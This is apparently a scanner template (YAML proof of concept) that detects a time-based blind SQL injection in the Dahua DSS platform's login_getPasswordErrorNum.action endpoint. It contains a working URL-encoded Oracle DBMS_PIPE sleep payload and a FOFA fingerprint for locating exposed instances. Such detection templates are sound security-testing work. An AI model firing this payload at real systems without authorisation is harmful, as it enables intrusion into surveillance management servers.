id: poc-yaml-dahua-dss-login-getpassworderrornum-action-sqli
info:
  name: Dahua DSS login_getPasswordErrorNum.action SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    finger: Dahua DSS Comprehensive Management Platform
    fofa: app="dahua-DSS"

variables:
  t1: "{{rand_int(5,10)}}"
  t2: "{{to_number(t1) + 2}}"

http:
  - id: login-init-check
    method: GET
    path:
      - "{{BaseURL}}/itc/login_init.action"
    matchers-condition: and
    matchers:
      - type: status
        status: [200]
      - type: word
        words:
          - "itc/login_init.action"

  - id: sqli-check
    method: GET
    path:
      - "{{BaseURL}}/itc/%24%7BappPath%7D/login_getPasswordErrorNum.action?userBean.loginName=admin%27%2F%2A%2A%2FAND%2F%2A%2A%2F9434%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2881%29%7C%7CCHR%2876%29%7C%7CCHR%2872%29%7C%7CCHR%2889%29%2C{{t1}}%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27FsqC%27%3D%27FsqC&userBean.loginPass=123456&_=1693797717346"
    matchers-condition: and
    matchers:
      - type: status
        status: [200]
      - type: word
        words:
          - ""
      - type: dsl
        dsl:
          - "duration > to_number(t1)"
          - "duration < to_number(t2)"
